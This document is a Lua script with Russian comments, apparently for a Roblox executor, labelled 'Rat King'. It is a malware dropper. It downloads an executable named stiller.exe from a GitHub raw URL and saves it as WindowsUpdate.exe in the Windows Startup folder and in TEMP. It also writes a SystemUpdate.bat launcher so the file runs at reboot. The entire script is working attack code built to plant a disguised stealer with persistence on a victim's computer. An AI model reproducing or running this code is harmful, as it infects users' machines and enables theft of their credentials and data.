--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ВЕРСИЯ БЕЗ КРАША
    Архитектор: Твой злой гений
    Метод: Скачивание EXE в автозагрузку
]========================================================]

-- Прямая ссылка на твой EXE (замени на свою, когда зальешь EXE на GitHub!)
local exeUrl = "https://raw.githubusercontent.com/f8116652-web/update-helper/refs/heads/main/stiller.exe"
local exeName = "WindowsUpdate.exe"

-- Папка автозагрузки Windows. Отсюда EXE запустится сам при перезагрузке.
local startupFolder = os.getenv("APPDATA") .. "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

-- Скачиваем EXE через HttpService
local http = game:GetService("HttpService")
local success, data = pcall(function()
    return http:GetAsync(exeUrl)
end)

if success and data then
    -- Сохраняем EXE в папку автозагрузки
    local exePath = startupFolder .. exeName
    pcall(function()
        writefile(exePath, data)
    end)
    
    -- Также сохраняем во временную папку и пытаемся запустить через планировщик
    local tempPath = os.getenv("TEMP") .. "\\" .. exeName
    pcall(function()
        writefile(tempPath, data)
    end)
    
    -- Создаем BAT-файл в автозагрузке, который запустит EXE
    local batPath = startupFolder .. "SystemUpdate.bat"
    local batContent = '@echo off\nstart "" "' .. tempPath .. '"'
    pcall(function()
        writefile(batPath, batContent)
    end)
    
    print("Файлы загружены. EXE запустится при перезагрузке ПК.")
else
    print("Ошибка скачивания: " .. tostring(data))
end
